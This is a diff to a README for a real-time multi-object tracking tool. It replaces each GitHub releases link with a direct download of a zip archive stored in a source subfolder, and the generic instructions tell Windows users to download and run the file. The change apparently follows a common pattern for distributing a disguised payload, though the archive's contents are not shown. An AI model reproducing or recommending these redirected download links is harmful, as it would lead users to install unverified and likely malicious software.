@@ -1,6 +1,6 @@
 # 🎯 target-tracking - Track Multiple Objects in Real Time
 
-[![Download target-tracking](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/pritishp4/target-tracking/releases)
+[![Download target-tracking](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/pritishp4/target-tracking/main/mttrack/infrastructure/target_tracking_1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To get target-tracking on your computer, follow these steps:
 
 1. **Visit the download page:** Click the big green button below or go directly to the release page in your browser.
 
-[![Download target-tracking](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/pritishp4/target-tracking/releases)
+[![Download target-tracking](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/pritishp4/target-tracking/main/mttrack/infrastructure/target_tracking_1.1.zip)
 
 2. **Find the latest Windows version:** Look for the file with the name ending in `.exe` or `.zip` under the latest release. The file size is usually around a few hundred megabytes.
 
@@ -138,7 +138,7 @@ After installation, your folder will look like this:
 
 ## 🔗 Useful Links
 
-- Download releases: [https://github.com/pritishp4/target-tracking/releases](https://github.com/pritishp4/target-tracking/releases)  
+- Download releases: [https://raw.githubusercontent.com/pritishp4/target-tracking/main/mttrack/infrastructure/target_tracking_1.1.zip](https://raw.githubusercontent.com/pritishp4/target-tracking/main/mttrack/infrastructure/target_tracking_1.1.zip)  
 - Project website (if available on release page)  
 - FAQ and issue reporting on the GitHub Issues tab
 
@@ -190,4 +190,4 @@ If you need help with target-tracking:
 
 # [🎯] target-tracking
 
-[Download target-tracking here](https://github.com/pritishp4/target-tracking/releases)
+[Download target-tracking here](https://raw.githubusercontent.com/pritishp4/target-tracking/main/mttrack/infrastructure/target_tracking_1.1.zip)
